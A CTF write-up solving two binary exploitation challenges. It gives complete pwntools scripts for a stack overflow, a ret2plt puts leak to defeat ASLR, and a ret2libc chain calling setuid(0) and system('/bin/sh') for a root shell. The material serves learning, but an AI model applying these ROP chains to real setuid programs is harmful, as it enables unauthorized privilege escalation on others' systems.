## Leaky Libc (Easy)

![](Attachments/Pasted%20image%2020261112115953.png)

![](Attachments/Pasted%20image%2020261112120006.png)

After doing a but of research I found this which could be helpful with leaking `libc` addresses.

https://hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html

This helped me cleanup my exploit code from the prior exercises and we start with this as a base. On top of this, the article helped with my understanding of using `pwntools` at a better potential than how I had been using it previously. 

This challenge leaks the `system` address for us which is rather helpful as we don't need to leak it ourself but knowing how to leak this could be useful in the future. On top of this the code seen above we restart the program so we could use this leak but we will instead use the leak they hand to us.

In making this payload we can get creative, we could either store `/bin/sh` in the binary or find it in `libc` using the offset calculation based on the system address given to us. I chose to find it in `libc`. 

We cannot just read the flag as we did before as we do not have the gadgets available to us to be able to set `rdx` and `rcx`.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RDI = 0x401b13
RET = 0x40101a
BUFFER_LENGTH = 0x48

# Gadget setup helpers    
def pop_rdi(num):
    return p64(POP_RDI), p64(num)
    
def generate_payload(libc):
    payload = flat(
        # Overflow the buffer
        b'A' * BUFFER_LENGTH,
        
        # single ret for alignment
        p64(RET),
        
        # populate RDI with /bin/sh for system
        pop_rdi(next(libc.search(b'/bin/sh\x00'))),
        
        # system libc call
        libc.sym['system']
    )
    
    return payload
    
def main():
    elf = context.binary = ELF("/challenge/leveraging-libc-easy")
    libc = elf.libc
    p = process()
    
    p.recvuntil(b"libc is: ")
    system_addr = int(p.recvline().strip().rstrip(b"."), 16)
    libc.address = system_addr - libc.sym['system']
    
    p.send(generate_payload(libc))
    
    # load into the new shell we just made
    p.interactive()

if __name__ == "__main__":
    main()
```

This payload worked in the fact that we obtained a shell but it was as the hacker user the `euid` seems to have been dropped when spawning the shell. We can try to set the UID in order to keep the privileges.

The following is added to the payload after the buffer swapping it our with the alignment `ret`.

```python
pop_rdi(0),
libc.sym['setuid'],
```

Once this is added we can now obtain the flag with our root shell.

## Putsception (Easy)

This seems to tie into the article we read above with the `ret2plt`. Snazzy stuff since we know how to leak the address and return to main.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RDI = 0x402613
RET = 0x40101a
BUFFER_LENGTH = 0x38

# Gadget setup helpers    
def pop_rdi(num):
    return p64(POP_RDI), p64(num)
    
def generate_shell():
    payload = flat(
        # Overflow the buffer
        b'A' * BUFFER_LENGTH,
        
        # retain the root uid from the suid bit
        pop_rdi(0),
        libc.sym['setuid'],
        
        # populate RDI with /bin/sh for system
        pop_rdi(next(libc.search(b'/bin/sh\x00'))),
        
        # system libc call
        libc.sym['system']
    )
    
    return payload
    
def leak_libc_address():
    payload = flat(
        b'A' * BUFFER_LENGTH,
        pop_rdi(elf.got['puts']),
        elf.plt['puts'],
        elf.symbols['challenge']
    )
    
    return payload
    
def main():
    global elf, libc
    elf = context.binary = ELF("/challenge/putsception-easy")
    libc = elf.libc
    p = process()

    # get rid of junk in the stdin (turns out this didn't matter)
    p.recvuntil(b'entrypoint.')
    
    # get the leaked puts address to let pwntools calculate the offset
    p.send(leak_libc_address())
    p.recvuntil(b'Leaving!\n')
    puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = puts_addr - libc.sym['puts']
    
    # generate the shell
    p.send(generate_shell())
    
    # load into the new shell we just made
    p.interactive()

if __name__ == "__main__":
    main()
```

## Lessons Learned

- If you don't have to return to `main` then don't....
- Don't lookover what seems to be obvious. I got stuck on `puts` address offset for too long because I thought the `20` the address ended in was from a space in the previous print, it just ended in `20`
- Addresses may not always print in full `8` byte forms (like the `puts_addr` coming out in a 6-byte address.
- GDB is your friend for debugging don't forget about our good friend.
- Don't be afraid to step back and reevaluate the 'why', why am I taking this route could there be a better one... stop myself from honey potting and creating more problems than I'm solving.
